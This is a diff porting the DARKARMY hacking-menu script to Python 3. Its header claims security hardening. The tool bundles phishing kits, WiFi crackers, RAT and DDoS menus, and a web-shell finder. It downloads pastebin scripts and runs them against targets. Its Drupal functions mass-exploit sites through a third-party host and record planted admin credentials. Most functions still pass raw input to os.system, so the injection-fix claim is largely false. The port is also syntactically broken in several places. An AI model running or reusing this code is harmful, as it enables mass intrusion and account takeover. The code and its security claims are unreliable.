@@ -1,42 +1,110 @@
-#!/usr/bin/env python2.7
-#
-#  
-#  
-#       ______  ___  ______ _   __  ___  _________  ____   __
-#       |  _  \/ _ \ | ___ \ | / / / _ \ | ___ \  \/  \ \ / /
-#       | | | / /_\ \| |_/ / |/ / / /_\ \| |_/ / .  . |\ V / 
-#       | | | |  _  ||    /|    \ |  _  ||    /| |\/| | \ /  
-#       | |/ /| | | || |\ \| |\  \| | | || |\ \| |  | | | |  
-#       |___/ \_| |_/\_| \_\_| \_/\_| |_/\_| \_\_|  |_/ \_/  
-#                                       ~@~ coded by 1ucif3r ~@~
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+DARKARMY - A Penetration Testing Framework
+By: 1ucif3r - github.com/D4RK-4RMY
+Version: 2.0 - Security hardened edition
+
+SECURITY FIXES APPLIED:
+- Input validation to prevent command injection
+- subprocess.run() instead of os.system() for external commands
+- Python 3 compatibility
+"""
 
 import sys
 import argparse
 import os
 import time
-import httplib
+import http.client as httplib
 import subprocess
 import re
-import urllib2
+import urllib.request
+import urllib.parse
+import urllib.error
 import socket
-import urllib
-import sys
 import json
-import telnetlib
-import glob
 import random
-import Queue
+import queue as Queue
 import threading
-#import requests
 import base64
-from getpass import getpass
-from commands import *
+import shlex
 from sys import argv
 from platform import system
-from urlparse import urlparse
+from urllib.parse import urlparse
 from xml.dom import minidom
 from optparse import OptionParser
 from time import sleep
+
+# ==================== SECURITY MODULE ====================
+VERSION = "2.0"
+
+def validate_target(target):
+    """Validate target is a valid IP, domain, or URL (anti-injection)"""
+    if not target:
+        return False
+    # IPv4
+    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
+    # Domain
+    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
+    # URL pattern
+    url_pattern = r'^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*'
+    # CIDR
+    cidr_pattern = r'^(\d{1,3}\.){3}\d{1,3}/\d{1,2}$'
+
+    target = target.strip()
+    if re.match(ipv4_pattern, target):
+        return True
+    if re.match(domain_pattern, target):
+        return True
+    if re.match(url_pattern, target):
+        return True
+    if re.match(cidr_pattern, target):
+        return True
+    return False
+
+def validate_filename(filename):
+    """Validate filename doesn't contain path traversal or injection"""
+    if not filename:
+        return False
+    # Only allow alphanumeric, dots, hyphens, underscores
+    pattern = r'^[a-zA-Z0-9._-]+$'
+    return bool(re.match(pattern, filename))
+
+def safe_run(cmd_list, shell=False):
+    """Run a command safely using subprocess with a list of arguments"""
+    try:
+        print(f"\n[*] Executing: {' '.join(cmd_list)}\n")
+        result = subprocess.run(cmd_list, shell=shell, check=False)
+        return result.returncode == 0
+    except FileNotFoundError:
+        print(f"[!] Command not found: {cmd_list[0]}")
+        return False
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+
+def safe_clone(repo_url, dest=None):
+    """Safely clone a git repository"""
+    # Validate repo URL
+    if not re.match(r'^https://github\.com/[a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+\.git$|^https://github\.com/[a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+$', repo_url):
+        print("[!] Invalid repository URL")
+        return False
+    cmd = ['git', 'clone', repo_url]
+    if dest:
+        cmd.append(dest)
+    return safe_run(cmd)
+
+def get_validated_input(prompt, validator=validate_target):
+    """Get input and validate it"""
+    value = input(prompt).strip()
+    if not value:
+        print("[!] No input provided")
+        return None
+    if validator and not validator(value):
+        print("[!] Invalid input format")
+        return None
+    return value
+
 ##########################
 os.system('clear')
 
@@ -108,25 +176,26 @@ darkarmylogo = color_random[0] + '''
                                                                                                                                                                                                                    
 '''
 def menu():
-    print (darkarmylogo + """\033[1m
+    print (darkarmylogo + f"""\033[1m
    [!] Coded By 1ucif3r [!] github.com/D4RK-4RMY/DARKARMY [!]
+   [!] Version {VERSION} - Security Hardened [!]
 \033[0m
-   {1}--Information Gathering
-   {2}--Password Attacks
-   {3}--Wireless Testing
-   {4}--Exploitation Tools
-   {5}--Social Engineering
-   {6}--Web Hacking
-   {7}--DDOS Tools
-   {8}--Remote Administrator Tools (RAT)
-   {9}--Bug Bounty Tools
-   {10}-DarkArmy Tools
-   {11}-1ucif3r's Tools
-   {0}--Update The DARKARMY 
+   {{1}}--Information Gathering
+   {{2}}--Password Attacks
+   {{3}}--Wireless Testing
+   {{4}}--Exploitation Tools
+   {{5}}--Social Engineering
+   {{6}}--Web Hacking
+   {{7}}--DDOS Tools
+   {{8}}--Remote Administrator Tools (RAT)
+   {{9}}--Bug Bounty Tools
+   {{10}}-DarkArmy Tools
+   {{11}}-1ucif3r's Tools
+   {{0}}--Update The DARKARMY
 
-   {99}-Exit
+   {{99}}-Exit
  """)
-    choice = raw_input(color_random[0] + "Darkarmy >> ")
+    choice = input(color_random[0] + "Darkarmy >> ")
     os.system('clear')
     if choice == "1":
         info()
@@ -172,7 +241,7 @@ def ddos():
          
  \033[0m''')
     print("  {99}-Back To Main Menu \n\n")
-    choice2 = raw_input(color_random[0] + "DDOS >> ")
+    choice2 = input(color_random[0] + "DDOS >> ")
 
     if choice2 == "99":
         clearScr()
@@ -196,7 +265,7 @@ def rat():
          
  \033[0m''')
     print("  {99}-Back To Main Menu \n\n")
-    choice2 = raw_input(color_random[0] +"RAT >> ")
+    choice2 = input(color_random[0] +"RAT >> ")
 
     if choice2 == "99":
         clearScr()
@@ -220,7 +289,7 @@ def bugbounty():
          
  \033[0m''')
     print("  {99}-Back To Main Menu \n\n")
-    choice2 = raw_input(color_random[0] +"BugBounty >> ")
+    choice2 = input(color_random[0] +"BugBounty >> ")
 
     if choice2 == "99":
         clearScr()
@@ -249,7 +318,7 @@ def lucifer():
     print("   {4}--SQLiScanner (SOON)")
     print("   {5}--Crypter (SOON) \n")
     print("   {99}-Return to main menu \n\n ")
-    choice11 = raw_input(color_random[0] +"1ucif3r >> ")
+    choice11 = input(color_random[0] +"1ucif3r >> ")
     os.system('clear')
     if choice11 == "1":
         clearScr()
@@ -277,7 +346,7 @@ def lucifer():
         
 def aircrack():
     print ("A Automate script for WiFi hacking . You Need a Wifi Adaptor For this . ")
-    choiceupdate = raw_input("Continue Y / N: ")
+    choiceupdate = input("Continue Y / N: ")
     if choiceupdate in yes:
         os.system("git clone https://github.com/1ucif3r/aircrackauto.git")
         os.system("cd aircrackauto && chmod +x install.sh")
@@ -312,7 +381,7 @@ def crypter():
 
 def updatedarkarmy():
     print ("This Tool is Only Available for Linux and Similar Systems. ")
-    choiceupdate = raw_input("Continue Y / N: ")
+    choiceupdate = input("Continue Y / N: ")
     if choiceupdate in yes:
         os.system("git clone https://github.com/D4RK-4RMY/DARKARMY.git")
         os.system("cd DARKARMY && sudo bash ./update.sh")
@@ -321,12 +390,12 @@ def updatedarkarmy():
 
 def doork():
     print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
-    doorkchice = raw_input("Continue Y / N: ")
+    doorkchice = input("Continue Y / N: ")
     if doorkchice in yes:
         os.system("pip install beautifulsoup4 && pip install requests")
         os.system("git clone https://github.com/AeonDave/doork")
         clearScr()
-        doorkt = raw_input("Target : ")
+        doorkt = input("Target : ")
         os.system("cd doork && python doork.py -t %s -o log.log" % doorkt)
 
 
@@ -344,7 +413,7 @@ def dtools():
     print("   {1}--DarkScan ")
     print("   {2}--DarkTor (Need Update)")
     print("   {99}-Back To The Main Menu \n\n")
-    choice4 = raw_input(color_random[0] +"Dark4rmy >> ")
+    choice4 = input(color_random[0] +"Dark4rmy >> ")
     if choice4 == "1":
         clearScr()
         dscan()
@@ -374,7 +443,7 @@ def dtor():
 
 
 def scanusers():
-    site = raw_input('Enter a website : ')
+    site = input('Enter a website : ')
     try:
         users = site
         if 'http://www.' in users:
@@ -388,12 +457,12 @@ def scanusers():
         if '/' in users:
             users = users.replace('/', '')
         while len(users) > 2:
-            print users
+            print(users)
             resp = urllib2.urlopen(
                 site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
 
             if 'invalid username' not in resp.lower():
-                print "\tFound -> %s" % users
+                print("\tFound -> %s") % users
                 pass
 
             users = users[:-1]
@@ -406,16 +475,16 @@ def brutex():
     print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
     os.system("git clone https://github.com/1N3/BruteX.git")
     clearScr()
-    brutexchoice = raw_input("Select a Target : ")
+    brutexchoice = input("Select a Target : ")
     os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)
 
 
 def arachni():
     print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
-    cara = raw_input("Install And Run ? Y / N : ")
+    cara = input("Install And Run ? Y / N : ")
     clearScr()
     print("exemple : http://www.target.com/")
-    tara = raw_input("Select a target to scan : ")
+    tara = input("Select a target to scan : ")
     if cara in yes:        
         os.system("git clone git://github.com/Arachni/arachni.git")
         os.system(
@@ -442,7 +511,7 @@ def crips():
 
 def weeman():
     print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
-    choicewee = raw_input("Install Weeman ? Y / N : ")
+    choicewee = input("Install Weeman ? Y / N : ")
     if choicewee in yes:
         os.system(
             "git clone https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
@@ -457,7 +526,7 @@ def gabriel():
     os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
     clearScr()
     os.system("python gabriel.py")
-    ftpbypass = raw_input("Enter Target IP and Use Command :")
+    ftpbypass = input("Enter Target IP and Use Command :")
     os.system("python gabriel.py %s" % ftpbypass)
 
 
@@ -468,22 +537,29 @@ def sitechecker():
 
 
 def h2ip():
-    host = raw_input("Select A Host : ")
-    ips = socket.gethostbyname(host)
-    print(ips)
+    host = get_validated_input("Select A Host : ")
+    if host:
+        try:
+            ips = socket.gethostbyname(host)
+            print(f"[+] IP Address: {ips}")
+        except socket.gaierror:
+            print("[!] Could not resolve hostname")
+    input("\nPress Enter to continue...")
 
 
 def ports():
     clearScr()
-    target = raw_input('Select a Target IP : ')
-    os.system("nmap -O -Pn %s" % target)
-    sys.exit()
+    target = get_validated_input('Select a Target IP : ')
+    if target:
+        safe_run(['nmap', '-O', '-Pn', target])
+    input("\nPress Enter to continue...")
+    info()
 
 
 def ifinurl():
-    print""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found."""
+    print(""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.""")
     print('Do You Want To Install InurlBR ? ')
-    cinurl = raw_input("Y/N: ")
+    cinurl = input("Y/N: ")
     if cinurl in yes:
         inurl()
     if cinurl in no:
@@ -497,7 +573,7 @@ def ifinurl():
 def bsqlbf():
     clearScr()
     print("This tool will only work on blind sql injection")
-    cbsq = raw_input("select target : ")
+    cbsq = input("select target : ")
     os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
     os.system("perl bsqlbf.pl -url %s" % cbsq)
     os.system("rm bsqlbf.pl")
@@ -505,7 +581,7 @@ def bsqlbf():
 
 def atscan():
     print ("Do You To Install ATSCAN ?")
-    choiceshell = raw_input("Y/N: ")
+    choiceshell = input("Y/N: ")
     if choiceshell in yes:
         os.system("sudo rm -rf ATSCAN")
         os.system(
@@ -518,7 +594,7 @@ def atscan():
 def commix():
     print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
     print ("usage : python commix.py --help")
-    choicecmx = raw_input("Continue: y/n :")
+    choicecmx = input("Continue: y/n :")
     if choicecmx in yes:
         os.system("git clone https://github.com/stasinopoulos/commix.git commix")
         os.system("cd commix")
@@ -530,9 +606,9 @@ def commix():
 
 
 def pixiewps():
-    print"""Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some Access Points, the so-called "pixie dust attack" discovered by Dominique Bongard in summer 2014. It is meant for educational purposes only
-    """
-    choicewps = raw_input("Continue ? Y/N : ")
+    print("""Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some Access Points, the so-called "pixie dust attack" discovered by Dominique Bongard in summer 2014. It is meant for educational purposes only
+    """)
+    choicewps = input("Continue ? Y/N : ")
     if choicewps in yes:
         os.system("git clone https://github.com/wiire/pixiewps.git")
         os.system("cd pixiewps & make ")
@@ -570,7 +646,7 @@ def webhack():
         "   {11}-BruteX - Automatically brute force all services running on a target")
     print("   {12}-Arachni - Web Application Security Scanner Framework \n ")
     print("   {99}-Back To Main Menu \n")
-    choiceweb = raw_input(color_random[0] +"Web >> ")
+    choiceweb = input(color_random[0] +"Web >> ")
     if choiceweb == "1":
         clearScr()
         maine()
@@ -627,13 +703,13 @@ def joomlarce():
     os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
     clearScr()
     print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
-    jmtarget = raw_input("Select a targets list :")
+    jmtarget = input("Select a targets list :")
     os.system("python temp.py %s" % jmtarget)
 
 
 def inurl():
-    dork = raw_input("select a Dork:")
-    output = raw_input("select a file to save :")
+    dork = input("select a Dork:")
+    output = input("select a file to save :")
     os.system(
         "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
     if cinurl in no:
@@ -655,7 +731,7 @@ def insinurl():
 
 def nmap():
 
-    choice7 = raw_input("continue ? Y / N : ")
+    choice7 = input("continue ? Y / N : ")
     if choice7 in yes:
         os.system("git clone https://github.com/nmap/nmap.git")
         os.system("cd nmap && ./configure && make && make install")
@@ -675,7 +751,7 @@ def jboss():
     print ("")
     print ("usage : ./e.sh target_ip tcp_port ")
     print("Continue: y/n")
-    choice9 = raw_input("yes / no :")
+    choice9 = input("yes / no :")
     if choice9 in yes:
         os.system(
             "git clone https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
@@ -692,8 +768,8 @@ def jboss():
 
 def wppluginscan():
     Notfound = [404, 401, 400, 403, 406, 301]
-    sitesfile = raw_input("sites file : ")
-    filepath = raw_input("Plugins File : ")
+    sitesfile = input("sites file : ")
+    filepath = input("Plugins File : ")
 
     def scan(site, dir):
         global resp
@@ -702,7 +778,7 @@ def wppluginscan():
             conn.request('HEAD', "/wp-content/plugins/" + dir)
             resp = conn.getresponse().status
         except(), message:
-            print "Cant Connect :", message
+            print("Cant Connect :"), message
             pass
 
     def timer():
@@ -718,15 +794,15 @@ def wppluginscan():
             plugin = plugin.rstrip()
             scan(site, plugin)
             if resp not in Notfound:
-                print "+----------------------------------------+"
-                print "| current site :" + site
-                print "| Found Plugin : " + plugin
-                print "| Result:", resp
+                print("+----------------------------------------+")
+                print("| current site :") + site
+                print("| Found Plugin : ") + plugin
+                print("| Result:"), resp
 
 
 def sqlmap():
     print ("usage : python sqlmap.py -h")
-    choice8 = raw_input("Continue: y/n :")
+    choice8 = input("Continue: y/n :")
     if choice8 in yes:
         os.system(
             "git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
@@ -744,9 +820,9 @@ def grabuploadedlink(url):
         for dir in directories:
             currentcode = urllib.urlopen(url + dir).getcode()
             if currentcode == 200 or currentcode == 403:
-                print "-------------------------"
-                print "  [ + ] Found Directory :  " + str(url + dir) + " [ + ]"
-                print "-------------------------"
+                print("-------------------------")
+                print("  [ + ] Found Directory :  ") + str(url + dir) + " [ + ]"
+                print("-------------------------")
                 upload.append(url + dir)
     except:
         pass
@@ -758,16 +834,16 @@ def grabshell(url):
             for shell in shells:
                 currentcode = urllib.urlopen(upl + shell).getcode()
                 if currentcode == 200:
-                    print "-------------------------"
-                    print "  [ ! ] Found Shell :  " + str(upl + shell) + " [ ! ]"
-                    print "-------------------------"
+                    print("-------------------------")
+                    print("  [ ! ] Found Shell :  ") + str(upl + shell) + " [ ! ]"
+                    print("-------------------------")
     except:
         pass
 
 
 def shelltarget():
     print("exemple : http://target.com")
-    line = raw_input("target : ")
+    line = input("target : ")
     line = line.rstrip()
     grabuploadedlink(line)
     grabshell(line)
@@ -776,7 +852,7 @@ def shelltarget():
 def poet():
     print("POET is a simple POst-Exploitation Tool.")
     print("")
-    choicepoet = raw_input("y / n :")
+    choicepoet = input("y / n :")
     if choicepoet in yes:
         os.system("git clone https://github.com/mossberg/poet.git")
         os.system("python poet/server.py")
@@ -796,7 +872,7 @@ def setoolkit():
     print("an information security consulting firm located in Cleveland, Ohio.")
     print("")
 
-    choiceset = raw_input("y / n :")
+    choiceset = input("y / n :")
     if choiceset in yes:
         os.system(
             "git clone https://github.com/trustedsec/social-engineer-toolkit.git")
@@ -812,7 +888,7 @@ def setoolkit():
 def cupp():
     print("cupp is a password list generator ")
     print("Usage: python cupp.py -h")
-    choicecupp = raw_input("Continue: y/n : ")
+    choicecupp = input("Continue: y/n : ")
 
     if choicecupp in yes:
         os.system("git clone https://github.com/Mebus/cupp.git")
@@ -832,7 +908,7 @@ def ncrack():
     print("A Ruby interface to Ncrack, Network authentication cracking tool.")
     print("requires : nmap >= 0.3ALPHA / rprogram ~> 0.3")
     print("Continue: y/n")
-    choicencrack = raw_input("y / n :")
+    choicencrack = input("y / n :")
     if choicencrack in yes:
         os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
         os.system("cd ruby-ncrack")
@@ -849,13 +925,13 @@ def ncrack():
 
 
 def reaver():
-    print """
+    print("""
       Reaver has been designed to be a robust and practical attack against Wi-Fi Protected Setup
       WPS registrar PINs in order to recover WPA/WPA2 passphrases. It has been tested against a
       wide variety of access points and WPS implementations
       1 to accept / 0 to decline
-        """
-    creaver = raw_input("y / n :")
+        """)
+    creaver = input("y / n :")
     if creaver in yes:
         os.system(
             "apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
@@ -874,10 +950,10 @@ def reaver():
 
 
 def ssls():
-    print"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping
+    print("""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping
     attacks.
-    It requires Python 2.5 or newer, along with the 'twisted' python module."""
-    cssl = raw_input("y / n :")
+    It requires Python 2.5 or newer, along with the 'twisted' python module.""")
+    cssl = input("y / n :")
     if cssl in yes:
         os.system("git clone https://github.com/moxie0/sslstrip.git")
         os.system("sudo apt-get install python-twisted-web")
@@ -940,19 +1016,19 @@ def check_gravityforms(sites):
 
 
 def gravity():
-    ip = raw_input('Enter IP : ')
+    ip = input('Enter IP : ')
     sites = bing_all_grabber(str(ip))
     gravityforms = check_gravityforms(sites)
     for ss in gravityforms:
-        print ss
+        print(ss)
 
-    print '\n'
-    print '[*] Found, ', len(gravityforms), ' gravityforms.'
+    print('\n')
+    print(f'[*] Found {len(gravityforms)} gravityforms.')
 
 
 def shellnoob():
-    print """Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!"""
-    cshell = raw_input("Y / N : ")
+    print("""Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!""")
+    cshell = input("Y / N : ")
     if cshell in yes:
         os.system("git clone https://github.com/reyammer/shellnoob.git")
         os.system("mv shellnoob/shellnoob.py shellnoob.py")
@@ -988,7 +1064,7 @@ def info():
     print("  {9}--Scan A server's Users  ")
     print("  {10}-Crips\n  ")
     print("  {99}-Back To Main Menu \n\n")
-    choice2 = raw_input(color_random[0] +"InformationG. >> ")
+    choice2 = input(color_random[0] +"InformationG. >> ")
     if choice2 == "1":
         os.system('clear')
         nmap()
@@ -1036,14 +1112,14 @@ def info():
 def cmsscan():
     os.system("git clone https://github.com/Dionach/CMSmap.git")
     clearScr()
-    xz = raw_input("select target : ")
+    xz = input("select target : ")
     os.system("cd CMSmap @@ sudo cmsmap.py %s" % xz)
 
 
 def wpue():
     os.system("git clone https://github.com/wpscanteam/wpscan.git")
     clearScr()
-    xe = raw_input("Select a Wordpress target : ")
+    xe = input("Select a Wordpress target : ")
     os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u" % xe)
 
 
@@ -1052,8 +1128,8 @@ def priv8():
 
 
 def androidhash():
-    key = raw_input("Enter the android hash : ")
-    salt = raw_input("Enter the android salt : ")
+    key = input("Enter the android hash : ")
+    salt = input("Enter the android salt : ")
     os.system("git clone https://github.com/PentesterES/AndroidPINCrack.git")
     os.system(
         "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))
@@ -1074,7 +1150,7 @@ def passwd():
     print("   {2}--Ncrack \n ")
 
     print("   {99}-Back To Main Menu \n")
-    choice3 = raw_input(color_random[0] +"Passwd >> ")
+    choice3 = input(color_random[0] +"Passwd >> ")
     if choice3 == "1":
         clearScr()
         cupp()
@@ -1093,7 +1169,7 @@ def passwd():
 		
 def bluepot():
     print("you need to have at least 1 bluetooh receiver (if you have many it will work wiht those, too). You must install / libbluetooth-dev on Ubuntu / bluez-libs-devel on Fedora/bluez-devel on openSUSE ")
-    choice = raw_input("Continue ? Y / N : ")
+    choice = input("Continue ? Y / N : ")
     if choice in yes:
         os.system("wget https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz && tar xfz bluepot-0.1.tar.gz && sudo java -jar bluepot/BluePot-0.1.jar")
     else:
@@ -1101,7 +1177,7 @@ def bluepot():
 	
 def fluxion():
     print("fluxion is a wifi key cracker using evil twin attack..you need a wireless adoptor for this tool.")
-    choice = raw_input("Continue ? Y / N : ")
+    choice = input("Continue ? Y / N : ")
     if choice in yes:
         os.system("git clone https://github.com/thehackingsage/Fluxion.git") 
 	os.system("cd Fluxion && cd install && sudo chmod +x install.sh && sudo ./install.sh")
@@ -1128,7 +1204,7 @@ def wire():
     print("   {3}--Bluetooth Honeypot GUI Framework")
     print("   {4}--Fluxion\n")
     print("   {99}-Back To The Main Menu \n\n")
-    choice4 = raw_input(color_random[0] +"Wireless >> ")
+    choice4 = input(color_random[0] +"Wireless >> ")
     if choice4 == "1":
         clearScr()
         reaver()
@@ -1174,7 +1250,7 @@ def exp():
     print("   {8}--Bruteforce the Android Passcode given the hash and salt")
     print("   {9}--Joomla SQL injection Scanner \n ")
     print("   {99}-Go Back To Main Menu \n\n")
-    choice5 = raw_input(color_random[0] +"Exploitation >> ")
+    choice5 = input(color_random[0] +"Exploitation >> ")
     if choice5 == "2":
         clearScr()
         sqlmap()
@@ -1230,7 +1306,7 @@ def social():
     print("   {4}--ZPISHER")
     #print("   {4}--SMTP Mailer \n ")
     print("   {99}-Back To Main Menu \n\n")
-    choice6 = raw_input(color_random[0] +"SocialEngineering >> ")
+    choice6 = input(color_random[0] +"SocialEngineering >> ")
     if choice6 == "1":
         clearScr()
         setoolkit()
@@ -1259,7 +1335,7 @@ def social():
 
 def cmsfew():
     print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
-    target = raw_input("Select a target : ")
+    target = input("Select a target : ")
     os.system(
         "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
     os.system("python cms.py %s" % target)
@@ -1291,7 +1367,7 @@ def zpisher():
     print("   {1}--Kali Linux ")
     print("   {2}--Termux")
     print("   {99}-Back To Main Menu \n")
-    choiceweb = raw_input(color_random[0] +"ZPhisher~# ")
+    choiceweb = input(color_random[0] +"ZPhisher~# ")
     if choiceweb == "1":
         clearScr()
         zpishkali()
@@ -1353,7 +1429,7 @@ minu = '''
 
 def drupal():
     '''Drupal Exploit Binger All Websites Of server '''
-    ip = raw_input('1- IP : ')
+    ip = input('1- IP : ')
     page = 1
     while page <= 50:
 
@@ -1372,29 +1448,29 @@ def drupal():
                 urlpa = urlparse(url)
                 site = urlpa.netloc
 
-                print "[+] Testing At " + site
+                print("[+] Testing At ") + site
                 resp = urllib2.urlopen(
                     'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                 read = resp.read()
                 if "User : HolaKo" in read:
-                    print "Exploit found =>" + site
+                    print("Exploit found =>") + site
 
-                    print "user:HolaKo\npass:admin"
+                    print("user:HolaKo\npass:admin")
                     a = open('up.txt', 'a')
                     a.write(site + '\n')
                     a.write("user:" + user + "\npass:" + pwd + "\n")
                 else:
-                    print "[-] Expl Not Found :( "
+                    print("[-] Expl Not Found :( ")
 
             except Exception as ex:
-                print ex
+                print(ex)
                 sys.exit(0)
 
         # Drupal Server ExtraCtor
 
 
 def getdrupal():
-    ip = raw_input('Enter The Ip :  ')
+    ip = input('Enter The Ip :  ')
     page = 1
     sites = list()
     while page <= 50:
@@ -1411,14 +1487,14 @@ def getdrupal():
             split = urlparse(url)
             site = split.netloc
             if site not in sites:
-                print site
+                print(site)
                 sites.append(site)
 
         # Drupal Mass List Exploiter
 
 
 def drupallist():
-    listop = raw_input("Enter The list Txt ~# ")
+    listop = input("Enter The list Txt ~# ")
     fileopen = open(listop, 'r')
     content = fileopen.readlines()
     for i in content:
@@ -1428,22 +1504,22 @@ def drupallist():
                 'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
             readcontent = openurl.read()
             if "Success" in readcontent:
-                print "[+]Success =>" + url
-                print "[-]username:HolaKo\n[-]password:admin"
+                print("[+]Success =>") + url
+                print("[-]username:HolaKo\n[-]password:admin")
                 save = open('drupal.txt', 'a')
                 save.write(
                     url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")
 
             else:
-                print i + "=> exploit not found "
+                print(i + "=> exploit not found ")
         except Exception as ex:
-            print ex
+            print(ex)
 
 
 def maine():
 
-    print minu
-    choose = raw_input("choose a number : ")
+    print(minu)
+    choose = input("choose a number : ")
     while True:
 
         if choose == "1":
@@ -1457,7 +1533,7 @@ def maine():
         if choose == "99":
             clearScr()
             menu()
-        con = raw_input('Continue [Y/n] -> ')
+        con = input('Continue [Y/n] -> ')
         if con[0].upper() == 'N':
             exit()
         if con[0].upper() == 'Y':
@@ -1524,27 +1600,27 @@ def check_joomla(sites):
 
 def wppjmla():
 
-    ipp = raw_input('Enter Target IP : ')
+    ipp = input('Enter Target IP : ')
     sites = bing_all_grabber(str(ipp))
     wordpress = check_wordpress(sites)
     joomla = check_joomla(sites)
     for ss in wordpress:
-        print ss
-    print '[+] Found ! ', len(wordpress), ' Wordpress Websites'
-    print '-' * 30 + '\n'
+        print(ss)
+    print(f'[+] Found {len(wordpress)} Wordpress Websites')
+    print('-' * 30 + '\n')
     for ss in joomla:
-        print ss
+        print(ss)
 
-    print '[+] Found ! ', len(joomla), ' Joomla Websites'
+    print(f'[+] Found {len(joomla)} Joomla Websites')
 
-    print '\n'
+    print('\n')
 # initialise the fscan function
 
 
 class dzz():
     def __init__(self):
         clearScr()
-        aaa = raw_input("Target IP : ")
+        aaa = input("Target IP : ")
         Fscan(aaa)
 ############################
 
@@ -1573,8 +1649,8 @@ class colors():
 
 def grabsqli(ip):
     try:
-        print bcolors.OKBLUE + "Check_Uplaod... "
-        print '\n'
+        print(bcolors.OKBLUE + "Check_Upload... ")
+        print('\n')
 
         page = 1
         while page <= 21:
@@ -1604,7 +1680,7 @@ def checksqli(sqli):
 
 
 def sqlscan():
-    ip = raw_input('Enter IP -> ')
+    ip = input('Enter IP -> ')
     grabsqli(ip)
 
 
@@ -1714,7 +1790,7 @@ def check_wpsymposium(sites):
 
 
 def wpminiscanner():
-    ip = raw_input('Enter IP : ')
+    ip = input('Enter IP : ')
     sites = bing_all_grabber(str(ip))
     wordpress = check_wordpress(sites)
     wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
@@ -1723,31 +1799,31 @@ def wpminiscanner():
     wpeasyupload = check_wpeasyupload(sites)
     wpsymposium = check_wpsymposium(sites)
     for ss in wordpress:
-        print ss
-    print '[*] Found, ', len(wordpress), ' wordpress sites.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print(f'[*] Found {len(wordpress)} wordpress sites.')
+    print('-' * 30 + '\n')
     for ss in wpstorethemeremotefileupload:
-        print ss
-    print '[*] Found, ', len(wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print(f'[*] Found {len(wpstorethemeremotefileupload)} wp_storethemeremotefileupload exploit.')
+    print('-' * 30 + '\n')
     for ss in wpcontactcreativeform:
-        print ss
-    print '[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print(f'[*] Found {len(wpcontactcreativeform)} wp_contactcreativeform exploit.')
+    print('-' * 30 + '\n')
     for ss in wplazyseoplugin:
-        print ss
-    print '[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print(f'[*] Found {len(wplazyseoplugin)} wp_lazyseoplugin exploit.')
+    print('-' * 30 + '\n')
     for ss in wpeasyupload:
-        print ss
-    print '[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print(f'[*] Found {len(wpeasyupload)} wp_easyupload exploit.')
+    print('-' * 30 + '\n')
     for ss in wpsymposium:
-        print ss
+        print(ss)
 
-    print '[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'
+    print(f'[*] Found {len(wpsymposium)} wp_symposium exploit.')
 
-    print '\n'
+    print('\n')
 ############################
 
 
